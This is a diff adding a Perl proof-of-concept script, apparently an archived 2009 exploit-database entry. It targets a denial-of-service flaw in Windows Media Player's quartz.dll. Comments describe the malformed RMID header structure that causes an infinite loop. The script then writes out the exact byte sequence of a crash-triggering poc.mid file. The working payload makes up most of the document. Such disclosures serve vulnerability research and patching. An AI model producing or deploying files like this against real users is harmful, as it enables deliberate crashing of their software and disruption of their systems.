@@ -1,0 +1,47 @@
+#! /usr/bin/perl
+# CAL_quartz_mid_poc.pl
+#
+# MircoSoft_Media_player_quartz.dll_mid_remote_Dos POC
+# by Code Audit Labs public 2009-04-17
+# http://www.vulnhunt.com/
+#
+#Affected
+#========
+#test on full updated winxp sp3
+#windows media Player 10.00.00.3998 quartz.dll 6.5.3790.4283
+#Windows Media Player 11.0.5721.5230 quartz.dll 6.5.2600.5596
+
+#other version should be affected
+
+# CVE: please assign to this a CVE id 
+#
+#ANALYSIS
+#========
+#  one vulnerability exists within the quartz.dll code processing RMID header
+#the struct have following
+#{
+#  char riff_id[4]; //'RIFF'
+#  DWORD rmid_size;
+#  char rmid_id[4]; //'RMID'
+#  char data_id[4]; //no eq data
+#  DWORD midi_size; 
+#}
+#if  data_id is not 'data' , and midi_size is 0xfffffff8.
+#the code would fall into infinity loop.
+
+#
+
+open(Fin, ">poc.mid") || die "can't create crash sample.$!";
+binmode(Fin);
+$data =  
+"\x52\x49\x46\x46\xff\xff\x00\x00\x52\x4d\x49\x44\x64\x64\x64\x64" .
+"\xf8\xff\xff\xff\x4d\x54\x68\x64\xff\xff\xff\xff\xf8\xff\xff\xf8" .
+"\xf8\xff\xff\xff\xf7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" .
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff" .
+"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff";
+
+print Fin $data;
+
+close(Fin);
+
+# milw0rm.com [2009-04-17]
